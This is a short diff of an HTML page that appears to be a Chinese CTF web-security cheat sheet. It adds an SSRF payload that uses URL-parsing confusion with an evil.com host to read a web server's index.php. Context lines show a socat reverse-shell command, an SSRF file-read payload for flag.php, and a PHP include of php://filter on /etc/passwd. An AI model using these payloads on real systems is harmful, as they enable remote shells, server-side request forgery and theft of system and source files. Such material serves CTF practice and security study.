@@ -1969,7 +1969,8 @@ socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,s
 </pre></div>
 
 <h2 id="ssrfpayload">ssrf常用payload<a class="headerlink" href="#ssrfpayload" title="Permanent link">&para;</a></h2>
-<p><code>admin=1&amp;url=file://www.ichunqiu.com/var/www/html/flag.php</code></p>
+<p><code>admin=1&amp;url=file://www.ichunqiu.com/var/www/html/flag.php</code>
+<code>file://user@evil.com:80@www.google.com//var/www/html/index.php%23</code></p>
 <h2 id="php7-bug">php7 直接崩溃bug<a class="headerlink" href="#php7-bug" title="Permanent link">&para;</a></h2>
 <p><code>include(‘php://filter/string.strip_tags/resource=/etc/passwd’)</code></p>
 <h2 id="ifs">$IFS<a class="headerlink" href="#ifs" title="Permanent link">&para;</a></h2>
